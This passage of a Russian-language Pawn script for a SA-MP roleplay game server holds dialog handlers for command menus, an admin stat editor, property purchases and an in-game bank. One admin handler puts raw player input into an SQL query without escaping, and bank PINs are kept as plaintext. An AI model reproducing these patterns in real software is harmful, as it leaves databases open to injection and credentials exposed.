				    	if(PI[playerid][pRank] >= 9) strcat(STRING_GLOBAL, "{66CC00}/rank_car - в разработке {FFFFFF}- "); //Егор
					}
					else if(IsAMafia(playerid))
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/f {FFFFFF}- чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/fn {FFFFFF}- NonRP чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/tie {FFFFFF}- связать игрока\n");
					    strcat(STRING_GLOBAL, "{66CC00}/incar {FFFFFF}- затолкать в машину\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/untie {FFFFFF}- развязать игрока\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/bizwar {FFFFFF}- забить стрелу за бизнес\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/bizlist {FFFFFF}- список бизнесов\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/loadgun {FFFFFF}- загрузка боеоприпасов\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/unloadgun {FFFFFF}- разагрузка боеоприпасов\n");
				    	if(PI[playerid][pRank] >= 9) strcat(STRING_GLOBAL, "{66CC00}/close {FFFFFF}- открыть/закрыть склад");
					}
					ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Организация", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 8:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}'ALT' {FFFFFF}- взаимодействие с дверями, воротами, розетками\n");
				    strcat(STRING_GLOBAL, "{66CC00}'NUM 6' {FFFFFF}- взаимодействие с инвентарем\n");
				    strcat(STRING_GLOBAL, "{66CC00}'С' {FFFFFF}- поднять предмет с пола\n");
				    strcat(STRING_GLOBAL, "{66CC00}'Y' {FFFFFF}- дать разрешение\n");
				    strcat(STRING_GLOBAL, "{66CC00}'N' {FFFFFF}- дать отказание\n");
				    strcat(STRING_GLOBAL, "{66CC00}'Q и E' {FFFFFF}- поворотники\n");
				    strcat(STRING_GLOBAL, "{66CC00}'2' {FFFFFF}- завести транспорт\n");
				    strcat(STRING_GLOBAL, "{66CC00}'ALT+W' {FFFFFF}- включить свет на транспорте");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Горячие клавиши", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 9:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/family_create {FFFFFF}- создать семьи(в разработке)\n");
				    strcat(STRING_GLOBAL, "{66CC00}/gang_create {FFFFFF}- создать банду(в разработке)\n");
					strcat(STRING_GLOBAL, "{66CC00}/family {FFFFFF}- меню семьи\n");
					strcat(STRING_GLOBAL, "{66CC00}/kinvite {FFFFFF}- принять игрока\n");
					strcat(STRING_GLOBAL, "{66CC00}/kuninvite {FFFFFF}- увольнить игрока онлайн\n");
					strcat(STRING_GLOBAL, "{66CC00}/kuninviteoff {FFFFFF}- увольнить игрока оффлайн\n");
					strcat(STRING_GLOBAL, "{66CC00}/krang {FFFFFF}- изменить ранг игроку\n");

				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Семья", STRING_GLOBAL, "Назад", "Закрыть");
				}
	        }
		}
		case 2282:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0:
				{
				    new till = 1000;
        			if(GetMoney(playerid) < till) return SendMess(playerid, MSG_NOT_MONEY);
		    	    GiveMoney(playerid, -till);
		    	    if(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] > 0)
		    	    {
				    	BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += till;
					    BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= 10;
					    BizzPay[GetPVarInt(playerid, "FuelBizzID")] += till;
					    MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "money", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney]);
					    MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
				    }
					GiveItem(playerid, 31, 1);
				    SendMes(playerid, COLOR_YELLOW,"Вы купили канистру за %iр!", till);
	          		DeletePVar(playerid,"FuelBizzID");
    			}
				case 1:
				{
					 new till = 8000;
        			 if(GetMoney(playerid) < till) return SendMess(playerid, MSG_NOT_MONEY);
                     GiveMoney(playerid, -till);
                     if(BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] > 0)
 		    		 {
						 BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney] += till/3;
		    			 BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct] -= 10;
		    			 BizzPay[GetPVarInt(playerid, "FuelBizzID")] += till;
	  					 MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "money", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bMoney]);
	  					 MysqlUpdateBizzInt(GetPVarInt(playerid, "FuelBizzID"), "product", BizzInfo[GetPVarInt(playerid, "FuelBizzID")][bProduct]);
  					 }
				     GiveItem(playerid, 32, 1);
				     SendMes(playerid, COLOR_YELLOW,"Вы купили набор инструментов за %iр!", till);
			         DeletePVar(playerid,"FuelBizzID");
				}
			}
		}
		case D_COMMAND_SHOW:
		{
		    if(!response) return 1;
		    else callcmd::cmd(playerid);
		}
		case D_UCPADMIN:
		{
			if(!response) return 1;
			new string[100];
			switch(listitem)
			{
				case 0:
				{
					format(string, sizeof(string), "{FFFFFF}Введите будущий ник для игрока: %s", GetName(NameStats[playerid]));
					ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Ник", string, "Принять", "Отмена");
					PlayerStats[playerid] = 1;
				}
				case 1:
				{
					format(string, sizeof(string), "{FFFFFF}Введите будущий уровень для игрока: %s", GetName(NameStats[playerid]));
					ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень", string, "Принять", "Отмена");
					PlayerStats[playerid] = 2;
				}
				case 2:
				{
					format(string, sizeof(string), "{FFFFFF}Введите количество опыта для игрока: %s", GetName(NameStats[playerid]));
					ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Опыт", string, "Принять", "Отмена");
					PlayerStats[playerid] = 3;
				}
				case 3:
				{
					format(string, sizeof(string), "{FFFFFF}Введите будущий пол для игрока: %s", GetName(NameStats[playerid]));
					ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол", string, "Принять", "Отмена");
					PlayerStats[playerid] = 4;
				}
				case 4:
				{
				    format(string, sizeof(string), "{FFFFFF}Введите количество фишек для игрока: %s", GetName(NameStats[playerid]));
					ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Игральные фишки", string, "Принять", "Отмена");
					PlayerStats[playerid] = 5;
				}
			}
		}
		case D_UCPADMIN2:
		{
			if(!response) return 1;
			new string[100];
			switch(PlayerStats[playerid])
			{
			case 1:
				{
					if(!strlen(inputtext))
					{
						format(string, sizeof(string), "{FFFFFF}Введите будущий ник для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Ник", string, "Принять", "Отмена");
						return 1;
					}
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name` = '%s'", inputtext);
					mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerSetName", "is", playerid, inputtext);
				}
			case 2:
				{
					if(!strlen(inputtext))
					{
						format(string, sizeof(string), "{FFFFFF}Введите будущий уровень для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень", string, "Принять", "Отмена");
						return 1;
					}
					if(strval(inputtext) < 1 || strval(inputtext) > 100)
					{
						format(string, sizeof(string), "{FFFFFF}Введите будущий уровень для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Уровень", string, "Принять", "Отмена");
						return 1;
					}
					SendMes(playerid, COLOR_LIME,"Вы установили уровень игрока %s на %d",GetName(NameStats[playerid]), strval(inputtext));
					SendMes(NameStats[playerid], COLOR_LIME, "Администратор %s установил вам уровень игрока на %d", GetName(playerid), strval(inputtext));
					PI[NameStats[playerid]][pLevel] = strval(inputtext);
					SetPlayerScore(NameStats[playerid], PI[NameStats[playerid]][pLevel]);
					MysqlUpdatePlayerInt(NameStats[playerid], "level", PI[NameStats[playerid]][pLevel]);
				}
			case 3:
				{
					if(!strlen(inputtext))
					{
						format(string, sizeof(string), "{FFFFFF}Введите количество опыта для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Опыт", string, "Принять", "Отмена");
						return 1;
					}
					if(strval(inputtext) < 1 || strval(inputtext) > 1000)
					{
						format(string, sizeof(string), "{FFFFFF}Введите количество опыта для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid,D_UCPADMIN2, DIALOG_STYLE_INPUT, "Опыт", string, "Принять", "Отмена");
						return 1;
					}
					SendMes(playerid, COLOR_LIME, "Вы установили опыт %s на %d", GetName(NameStats[playerid]), strval(inputtext));
					SendMes(NameStats[playerid], COLOR_LIME, "Администратор %s установил вам опыт на %d", GetName(playerid), strval(inputtext));
					PI[NameStats[playerid]][pExp] = strval(inputtext);
					MysqlUpdatePlayerInt(NameStats[playerid], "exp", PI[NameStats[playerid]][pExp]);
				}
			case 4:
				{
					if(!strlen(inputtext))
					{
						format(string, sizeof(string), "{FFFFFF}Введите будущий пол для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол", string, "Принять", "Отмена");
						return 1;
					}
					if(strval(inputtext) < 1 || strval(inputtext) > 2)
					{
						format(string, sizeof(string), "{FFFFFF}Введите будущий пол для игрока: %s", GetName(NameStats[playerid]));
						ShowPlayerDialog(playerid, D_UCPADMIN2, DIALOG_STYLE_INPUT, "Пол", string, "Принять", "Отмена");
						return 1;
					}
					SendMes(playerid, COLOR_LIME, "Вы изменили пол игроку %s на %s",GetName(NameStats[playerid]), (strval(inputtext)==1)?("мужской"):("женский"));
					SendMes(NameStats[playerid], COLOR_LIME, "Администратор %s изменил Ваш пол на %s", GetName(playerid), (strval(inputtext)==1)?("мужской"):("женский"));
					PI[NameStats[playerid]][pSex] = strval(inputtext);
					MysqlUpdatePlayerInt(NameStats[playerid], "sex", PI[NameStats[playerid]][pSex]);
				}
			}
			PlayerStats[playerid] = 0;
		}
    case D_UNIVER:
		{
		    if(!response) return 1;
		    if(PI[playerid][pWatch] == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже поступили в Университет");
			else if(PhoneNumbers[playerid][1] == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет паспорта");
			else if(PhoneNumbers[playerid][2] < 2) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет мед. карты");
			SendClientMessage(playerid,COLOR_GREY,"Ваши документы были поданы в Университет.");
   			PI[playerid][pWatch] = 1;
			MysqlUpdatePlayerInt(playerid, "watch", PI[playerid][pWatch]);
		}
    case D_UNIVER+1:
		{
			if(!response) return 1;
			SetPVarInt(playerid, "payer", gettime()+600);
			ShowUnTestQuestion(playerid,0,5,D_UNIVER+2);
		}
	case D_UNIVER+2:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pUnTestQNumber];
			if(!listitem) return ShowUnTestQuestion(playerid,0,2,D_UNIVER+2,q);
			if(listitem != gUniverTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowUnTestQuestion(playerid,5,10,D_UNIVER+3);
		}
	case D_UNIVER+3:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pUnTestQNumber];
			if(!listitem) return ShowUnTestQuestion(playerid,2,4,D_UNIVER+3,q);
			if(listitem != gUniverTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowUnTestQuestion(playerid,10,15,D_UNIVER+4);
		}
	case D_UNIVER+4:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pUnTestQNumber];
			if(!listitem) return ShowUnTestQuestion(playerid,4,6,D_UNIVER+4,q);
			if(listitem != gUniverTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowUnTestQuestion(playerid,15,20,D_UNIVER+5);
		}
	case D_UNIVER+5:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pUnTestQNumber];
			if(!listitem) return ShowUnTestQuestion(playerid,6,8,D_UNIVER+5,q);
			if(listitem != gUniverTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			ShowUnTestQuestion(playerid,20,25,D_UNIVER+6);
		}
	case D_UNIVER+6:
		{
			if(!response) return 1;
			new q = pTemp[playerid][pUnTestQNumber];
			if(!listitem) return ShowUnTestQuestion(playerid,8,12,D_UNIVER+6,q);
			if(listitem != gUniverTrueAnswer[q]) return SendClientMessage(playerid,COLOR_GREY,"К сожалению Вы ответили неверно. Тест провален");
			PI[playerid][pWatch] = 2;
			MysqlUpdatePlayerInt(playerid, "watch", PI[playerid][pWatch]);
			SendClientMessage(playerid,COLOR_GREY,"Поздравляем, Вы сдали экзамен, чтобы показать диплом '/diplom'");
		}
	case D_ADDNED:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						STRING_GLOBAL[0] = EOS;
						strcat(STRING_GLOBAL,"ВАЖНО: Тип интерьера\n\nПРИМЕР: 1\n\n");
						strcat(STRING_GLOBAL,"1. Низкий класс\n");
						strcat(STRING_GLOBAL,"2. Средний класс\n");
						strcat(STRING_GLOBAL,"3. Высокий класс\n");
						strcat(STRING_GLOBAL,"4. Семейный дом");
						ShowPlayerDialog(playerid,D_ADDNED+1,1,"Добавить дом",STRING_GLOBAL,"Выбрать","Закрыть");
					}
					case 1: ShowPlayerDialog(playerid, D_ADDNED+4, 2, "Добавить бизнес", "Магазин 24/7\nЗаправка\nПиццерия\nРиэлторское агентство\nТранспортная компания\nАвтосалон (легковые)\nАвтосалон (грузовики)\nСвободно\nБар\nАммуниция\nКлуб\nСТО\nМагазин одежды\nКазино", "Принять", "Отмена");
					case 2: ShowPlayerDialog(playerid, D_NMENU+15, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
					case 3: ShowPlayerDialog(playerid, D_ADDNED+5, 0, "Добавить ATM", "Вы хотите начать установку банкомата?", "Да", "Нет");
					case 4: ShowPlayerDialog(playerid, DIALOG_GARAGE_CREATE, DIALOG_STYLE_INPUT, "Добавить гараж", "{ffffff}\n\nЧтобы создать гараж, введите его стоимость в окно ниже:\n\n ", "Далее", "Отмена");
					case 5: ShowPlayerDialog(playerid, DIALOG_CREATE_ENTRANCE, DIALOG_STYLE_INPUT, "Добавить подъезд", "Вы должны стоять на входе будущий подъезд!\nВведите стоимость квартир:", "Далее", "Отмена");
				}
			}
			return 1;
		}

	case DIALOG_GARAGE_BUY:
	{
	    if(!response) return 1;

	    new garage_id = GetNearestGarage(playerid);

	    if(garage_id != -1)
	    {
	        if(GetPlayerGarage(playerid) != 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Ошибка: У Вас уже есть гараж");

	            return 1;
	        }

	        if(strcmp(g_garages[garage_id][G_OWNER], "None", true))
			{
			    SendClientMessage(playerid, COLOR_GREY, "Ошибка: Данный гараж уже принадлежит кому-то");

			    return 1;
			}

			if(g_garages[garage_id][G_PRICE] > PI[playerid][pCash])
			{
			    SendClientMessage(playerid, COLOR_GREY, "Ошибка: Недостаточно средств для покупки данного гаража");

			    return 1;
			}

			PI[playerid][pCash] -= g_garages[garage_id][G_PRICE];

			format(g_garages[garage_id][G_OWNER], 21, "%s", GetName(playerid));

			new fmt_text[256];

			mysql_format(dbHandle, fmt_text, sizeof fmt_text, "UPDATE garages g, accounts a SET g.owner='%s', a.cash=%d WHERE g.id=%d AND a.name='%e'", GetName(playerid), PI[playerid][pCash], g_garages[garage_id][G_SQL_ID], GetName(playerid));
			mysql_tquery(dbHandle, fmt_text);

			format(fmt_text, sizeof fmt_text, "Вы успешно приобрели гараж №%d. Используйте {FFFF00}/garage", g_garages[garage_id][G_SQL_ID]);
			SendClientMessage(playerid, 0x66CC33FF, fmt_text);

			UpdateGarage(garage_id);
	    }

	    return 1;
	}

	case DIALOG_BANK_MENU:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowPlayerBankAccounts(playerid);
				}
				case 1:
				{
					ShowPlayerBankAccountCreate(playerid);
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNTS:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowPlayerBankAccounts(playerid);
				}
				case 1:
				{
					ShowPlayerBankPanel(playerid);
				}
				case 2..(MAX_BANK_ACCOUNTS+2):
				{
					new accountid = g_player_listitem[playerid][listitem-2];
					if(IsValidBankAccount(playerid, accountid))
					{
						g_player_listitem_use[playerid] = accountid;
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_LOGIN, DIALOG_STYLE_PASSWORD,
							"{FFCC00}Авторизация",
							"{FFFFFF}Введите PIN-код счета:",
							"Далее", "Отмена"
						);
					}
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_LOGIN:
	{
		if(response)
		{
			if(strlen(inputtext) == 0) return ShowPlayerBankAccounts(playerid);

			new accountid = g_player_listitem_use[playerid];

			if(IsValidBankAccount(playerid, accountid))
			{
				if(!strcmp(g_bank_accounts[playerid][accountid][B_PIN_CODE], inputtext, false))
				{
					ShowPlayerBankAccountOperation(playerid);
				}
				else
				{
					ShowPlayerDialog
					(
						playerid, 0, DIALOG_STYLE_MSGBOX,
						"{FFCC00}Ошибка",
						"{FFFFFF}Вы ввели неверный PIN-код",
						"Закрыть", ""
					);
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_OPERATION:
	{
		if(response)
		{
			new accountid = g_player_listitem_use[playerid];

			if(IsValidBankAccount(playerid, accountid))
			{
				switch(listitem)
				{
					case 0:
					{
						new year, month, day;
						new hour, minute, second;
						timestamp_to_date(g_bank_accounts[playerid][accountid][B_REG_TIME], year, month, day, hour, minute, second);

						STRING_GLOBAL[0] = EOS;
						format
						(
							STRING_GLOBAL, sizeof STRING_GLOBAL,
							"{ffffff}Номер счета:\t\t%d\n"\
							"Название:\t\t%s\n"\
							"Баланс:\t\t{ffcc00}%d руб\n"\
							"{ffffff}Дата создания:\t\t%d-%02d-%02d %02d:%02d:%02d",
							g_bank_accounts[playerid][accountid][B_ID],
							g_bank_accounts[playerid][accountid][B_NAME],
							g_bank_accounts[playerid][accountid][B_BALANCE],
							year, month, day, hour, minute, second
						);

						ShowPlayerDialog
						(
							playerid, 0, DIALOG_STYLE_MSGBOX,
							"{ffcc00}Информация о счете",
							STRING_GLOBAL,
							"Закрыть", ""
						);
					}
					case 1:
					{
						ShowPlayerBankAccountLog(playerid, g_bank_accounts[playerid][accountid][B_ID]);
					}
					case 2:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_TAKE_MONEY, DIALOG_STYLE_INPUT,
							"{ffcc00}Снять деньги",
							"{ffffff}Введите сумму которую Вы хотите снять:",
							"Снять", "Отмена"
						);
					}
					case 3:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_PUT_MONEY, DIALOG_STYLE_INPUT,
							"{ffcc00}Положить деньги",
							"{ffffff}Введите сумму которую Вы хотите положить:",
							"Положить", "Отмена"
						);
					}
					case 4:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_TRANSFER, DIALOG_STYLE_INPUT,
							"{ffcc00}Перевод средств",
							"{ffffff}Введите номер счета и сумму через пробел:",
							"Положить", "Отмена"
						);
					}
					case 5:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_CHANGE_NAME, DIALOG_STYLE_INPUT,
							"{ffcc00}Переименование счета",
							"{ffffff}Введите название для счета:",
							"Переименовать", "Отмена"
						);
					}
					case 6:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_BANK_ACCOUNT_CHANGE_PIN, DIALOG_STYLE_INPUT,
							"{ffcc00}Изменение PIN-код",
							"{ffffff}Введите новый PIN-код (длина 4-8 цифр):",
							"Изменить", "Отмена"
						);
					}
					case 7:
					{
						if(!GetPlayerFines(playerid))
							return SendClientMessage(playerid, C_RED, "У Вас нет неоплаченных штрафов");

						ShowPlayerDialog
						(
							playerid, DIALOG_PAY_FINES, DIALOG_STYLE_INPUT,
							"{FFCC00}Оплата штрафа",
							"{FFFFFF}Введите номер штрафа, который Вы хотите оплатить:",
							"Оплатить", "Отмена"
						);
					}
					case 8:
					{
						if(!GetPlayerFines(playerid))
							return SendClientMessage(playerid, C_RED, "У Вас нет неоплаченных штрафов");

						new rows, Cache: result;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE owner_id=%d", PI[playerid][pID]);
						result = mysql_query(dbHandle, STRING_GLOBAL);

						rows = cache_num_rows();

						new amount = 0;

						for(new idx; idx < rows; idx ++)
						{
							amount += cache_get_field_content_int(idx, "amount");
						}

						STRING_GLOBAL[0] = EOS;
						format
						(
							STRING_GLOBAL, sizeof STRING_GLOBAL,
							"{FFFFFF}Сумма всех Ваших штрафов составляет {FFCC00}%d рублей\n"\
							"{FFFFFF}Вы действительно хотите оплатить все Ваши штрафы?",
							amount
						);

						ShowPlayerDialog
						(
							playerid, DIALOG_PAY_FINES_ALL, DIALOG_STYLE_MSGBOX,
							"{FFCC00}Оплата всех штрафов",
							STRING_GLOBAL,
							"Оплатить", "Отмена"
						);

						g_player_listitem[playerid][0] = amount;

						cache_delete(result);

					}
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_CHANGE_PIN:
	{
		if(response)
		{
			new accountid = g_player_listitem_use[playerid];
			if(IsValidBankAccount(playerid, accountid))
			{
				new len = strlen(inputtext);

				if(4 <= len <= 8 && IsNumeric(inputtext))
				{
					STRING_GLOBAL[0] = EOS;
					mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET pin_code='%e' WHERE id=%d LIMIT 1", inputtext, g_bank_accounts[playerid][accountid][B_ID]);
					mysql_query(dbHandle, STRING_GLOBAL);

					format(g_bank_accounts[playerid][accountid][B_PIN_CODE], 9, "%s", inputtext);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно изменили PIN-код своего счета №%d на \"%s\"", g_bank_accounts[playerid][accountid][B_ID], inputtext);
					SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
					SendClientMessage(playerid, COLOR_LIME, "Рекомендуется сделать скриншот. Клавиша: {ffffff}F8");

					new reason[64];
					format(reason, sizeof reason, "* Изменение PIN-кода");
					SendBankAccountLog(playerid, g_bank_accounts[playerid][accountid][B_ID], reason);
				}
			}
		}
	}
	case DIALOG_BANK_ACCOUNT_CHANGE_NAME:
	{
		if(response)
		{
			new accountid = g_player_listitem_use[playerid];

			if(IsValidBankAccount(playerid, accountid))
			{
				new len = strlen(inputtext);

				if(3 <= len <= 20)
				{
					if(!IsABadBankAccountName(inputtext))
					{
						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET name='%e' WHERE id=%d LIMIT 1", inputtext, g_bank_accounts[playerid][accountid][B_ID]);
						mysql_query(dbHandle, STRING_GLOBAL);

						format(g_bank_accounts[playerid][accountid][B_NAME], 21, "%s", inputtext);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно переименовали свой счет №%d на \"%s\"", g_bank_accounts[playerid][accountid][B_ID], inputtext);
						SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

						new reason[64];
						format(reason, sizeof reason, "* Переименование счета на \"%s\"", inputtext);
						SendBankAccountLog(playerid, g_bank_accounts[playerid][accountid][B_ID], reason);
					}
					else
					{
						SendClientMessage(playerid, C_RED, "Вы ввели неверное название счета.");
						SendClientMessage(playerid, C_RED, "Можно использовать русские и английские цифры, а также цифры");
					}
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_TAKE_MONEY:
	{
		if(response)
		{
			new accountid = g_player_listitem_use[playerid];

			if(IsValidBankAccount(playerid, accountid))
			{
				new take_sum = strval(inputtext);
				if(take_sum > 0 && IsNumeric(inputtext))
				{
					if(g_bank_accounts[playerid][accountid][B_BALANCE] >= take_sum)
					{
						if(GetMoney(playerid) + take_sum > 1000000000)
							return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 1000000000 рублей");

						g_bank_accounts[playerid][accountid][B_BALANCE] -= take_sum;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET balance=%d WHERE id=%d", g_bank_accounts[playerid][accountid][B_BALANCE], g_bank_accounts[playerid][accountid][B_ID]);
						mysql_query(dbHandle, STRING_GLOBAL);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно сняли со своего счета %s %d рублей. Остаток: %d рублей", g_bank_accounts[playerid][accountid][B_NAME], take_sum, g_bank_accounts[playerid][accountid][B_BALANCE]);
						SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

						GiveMoney(playerid, take_sum);

						new reason[64];
						format(reason, sizeof reason, "- Снятие наличных на сумму %d рублей", take_sum);
						SendBankAccountLog(playerid, g_bank_accounts[playerid][accountid][B_ID], reason);
					}
					else SendClientMessage(playerid, C_RED, "У Вас недостаточно денег на этому счету");
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_PUT_MONEY:
	{
		if(response)
		{
			new accountid = g_player_listitem_use[playerid];

			if(IsValidBankAccount(playerid, accountid))
			{
				new put_sum = strval(inputtext);
				if(put_sum > 0 && IsNumeric(inputtext))
				{
					if(GetMoney(playerid) >= put_sum)
					{
						if(g_bank_accounts[playerid][accountid][B_BALANCE] + put_sum > 1000000000)
							return SendClientMessage(playerid, C_RED, "На счете запрещено иметь более 1000000000 рублей");

						GiveMoney(playerid, -put_sum);
						g_bank_accounts[playerid][accountid][B_BALANCE] += put_sum;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bank_accounts SET balance=%d WHERE id=%d", g_bank_accounts[playerid][accountid][B_BALANCE], g_bank_accounts[playerid][accountid][B_ID]);
						mysql_query(dbHandle, STRING_GLOBAL);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно положили на свой счет %s на %d рублей. Остаток: %d рублей", g_bank_accounts[playerid][accountid][B_NAME], put_sum, g_bank_accounts[playerid][accountid][B_BALANCE]);
						SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

						new reason[64];
						format(reason, sizeof reason, "+ Пополнение наличных на сумму %d рублей", put_sum);
						SendBankAccountLog(playerid, g_bank_accounts[playerid][accountid][B_ID], reason);
					}
					else SendClientMessage(playerid, C_RED, "У Вас недостаточно денег");
				}
			}
		}
	}

	case DIALOG_BANK_ACCOUNT_TRANSFER:
	{
		if(response)
		{
			new to_account, sum;

			if(sscanf(inputtext, "dd", to_account, sum))
				return ShowPlayerDialog(playerid, DIALOG_BANK_ACCOUNT_TRANSFER, DIALOG_STYLE_INPUT, "{ffcc00}Перевод средств", "{ffffff}Введите номер счета и сумму через пробел:", "Положить", "Отмена");

			if(0 < sum < 999999999)
			{
				new accountid = g_player_listitem_use[playerid];

				if(IsValidBankAccount(playerid, accountid))
				{
					new Cache: result;
					new rows;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM bank_accounts WHERE id=%d", to_account);
					result = mysql_query(dbHandle, STRING_GLOBAL);

					rows = cache_num_rows();

					if(rows)
					{
						if(g_bank_accounts[playerid][accountid][B_BALANCE] >= sum)
						{
							/*STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT balance FROM bank_accounts WHERE id=%d", to_account);
							result = mysql_query(dbHandle, STRING_GLOBAL);*/

							new balance = cache_get_field_content_int(0, "balance");

							if(balance + sum > 1000000000)
								return SendClientMessage(playerid, C_RED, "Лимит на этом счете будет превышен");

							new id = cache_get_field_content_int(0, "owner_id");

							foreach(new to_player: Player)
							{
								if(PI[to_player][pID] == id)
								{
									STRING_GLOBAL[0] = EOS;
									format(STRING_GLOBAL, sizeof STRING_GLOBAL, "На Ваш счет №%d поступил перевод на %d рублей от %s [%d]", to_account, sum, GetName(playerid), playerid);
									SendClientMessage(to_player, C_OSNOV, STRING_GLOBAL);
								}
							}

							STRING_GLOBAL[0] = EOS;
